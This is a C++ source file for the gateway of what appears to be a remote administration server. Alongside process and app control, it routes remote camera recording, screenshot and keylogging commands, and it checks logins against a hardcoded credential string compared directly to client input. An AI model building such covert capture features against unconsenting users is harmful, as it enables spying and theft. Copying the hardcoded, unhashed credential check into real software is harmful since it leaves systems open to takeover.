#include "Gateway.hpp"

Gateway::Gateway(WSServer& server, std::shared_ptr<Router> router) : server_(server), router_(router) {
    registerInternalRoutes();
}

bool Gateway::validateLogin(const json& data) {
    if (!data.contains("user") || !data.contains("pass")) {
        std::cerr << "[Gateway] Login failed: Missing user or pass field";
        return false;
    }
    std::string user = data["user"];
    std::string pass = data["pass"];

    const std::string VALID_USER = "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918";
    const std::string VALID_PASS = "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918";
    return user == VALID_USER && pass == VALID_PASS;
}

void Gateway::onMessage(SessionPtr session, const Message& msg) {
    //std::cout << "[Gateway] Received from " << clientId << ": " << payload << "\n";
    if (session->isLoggedIn() || msg.type == Protocol::TYPE::AUTH) {
        router_->dispatch(msg, session);
    } else {
        session->send(Message(Protocol::TYPE::ERROR, {{"msg", "Please login first"}}).serialize());
    }
}

void Gateway::registerInternalRoutes() {
    router_->registerHandler(
        Protocol::TYPE::PING,
        [](const Message&, Gateway::SessionPtr s) {
            s->send(
                Message(Protocol::TYPE::PONG, "Server Alive").serialize()
            );
        }
    );

    router_->registerHandler(
        Protocol::TYPE::AUTH,
        [this](const Message& msg, Gateway::SessionPtr session) {
            if (msg.data.is_object() && this->validateLogin(msg.data)) {
                session->setAuthenticated(true);
                session->send(Message(Protocol::TYPE::AUTH, {{"status", "ok"}, {"msg", "Auth successful!"}}).serialize());
            } else {
                session->send(Message(Protocol::TYPE::AUTH, {{"status", "failed"}, {"msg", "Auth failed!"}}).serialize());
            }
        }
    );

    router_->registerHandler(
        Protocol::TYPE::HEARTBEAT,
        [](const Message&, Gateway::SessionPtr s) {
            s->send(
                Message(Protocol::TYPE::HEARTBEAT, "bump - bump").serialize()
            );
        }
    );
    
    router_->registerHandler(
        Protocol::TYPE::BROADCAST, 
        [this](const Message& msg, SessionPtr session) {
            this->server_.broadcast(msg);
    });

    auto systemCommandHandler = [](const Message& msg, SessionPtr session) {
        cout << "[Gateway] Executing command: " << msg.type << "\n";
        Message response = ParseCommand(msg);
        session->send(response.serialize());
    };

    router_->registerHandler(Protocol::TYPE::APP_LIST, systemCommandHandler);
    router_->registerHandler(Protocol::TYPE::APP_START, systemCommandHandler);
    router_->registerHandler(Protocol::TYPE::APP_KILL, systemCommandHandler);

    router_->registerHandler(Protocol::TYPE::PROC_LIST, systemCommandHandler);
    router_->registerHandler(Protocol::TYPE::PROC_START, systemCommandHandler);
    router_->registerHandler(Protocol::TYPE::PROC_KILL, systemCommandHandler);

    router_->registerHandler(Protocol::TYPE::CAM_RECORD, systemCommandHandler);
    router_->registerHandler(Protocol::TYPE::SCREENSHOT, systemCommandHandler);

    router_->registerHandler(Protocol::TYPE::START_KEYLOG, systemCommandHandler);
    router_->registerHandler(Protocol::TYPE::STOP_KEYLOG, systemCommandHandler);
}
